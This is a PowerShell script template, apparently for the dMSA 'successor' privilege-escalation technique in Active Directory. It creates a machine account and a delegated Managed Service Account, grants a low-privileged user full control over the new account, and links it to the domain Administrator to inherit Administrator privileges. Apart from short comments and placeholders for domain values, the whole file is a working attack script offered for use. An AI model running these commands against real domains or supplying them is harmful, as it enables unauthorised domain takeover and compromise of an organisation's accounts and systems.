# PLEASE REPLACE ALL THE FIELDS ENCLOSED IN < > WITH APPROPRIATE VALUES

# Creating a Machine Account to Request TGS from the dMSA that we are going to Create.
New-ADComputer -Name PwnedMachine -SAMAccountName "PwnedMachine$" -AccountPassword (ConvertTo-SecureString -String "NewP@ssw0rd" -AsPlainText -Force) -Enabled $true -Path "<DN of the OU with CreateChild Permission - Ex: OU=Finance,DC=example,DC=com>" -PassThru -Server <Target Domain Server - Ex: DC01>

# Creating the dMSA Account
New-ADServiceAccount -Name 'pwned_dmsa' -DNSHostName '<Domain - Ex: example.com>' -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword 'PwnedMachine$' -Path "<DN of the OU with CreateChild Permission - Ex: OU=Finance,DC=example,DC=com>"

# Granting Write Permission to the dMSA Account that we just created.
$sid = (Get-ADUser -Identity '<low privileged account name - Ex: john.doe').SID
$acl = Get-Acl "AD:\CN=pwned_dmsa,<DN of the OU with CreateChild Permisson - Ex: OU=Finance,DC=example,DC=com>"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=pwned_dmsa,<DN of the OU with CreateChild Permisson - Ex: OU=Finance,DC=example,DC=com>" -AclObject $acl

# This is the important part: We set the dMSA as the successor of Administrator to get Administrator Privileges.
$dmsa = [ADSI]"LDAP://CN=pwned_dmsa,<DN of the OU with CreateChild Permisson - Ex: OU=Finance,DC=example,DC=com>"
$dmsa.put("msDS-DelegatedMSAState", 2)
$dmsa.put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,<DN of the Domain - Ex: DC=example,DC=htb>")
$dmsa.SetInfo()

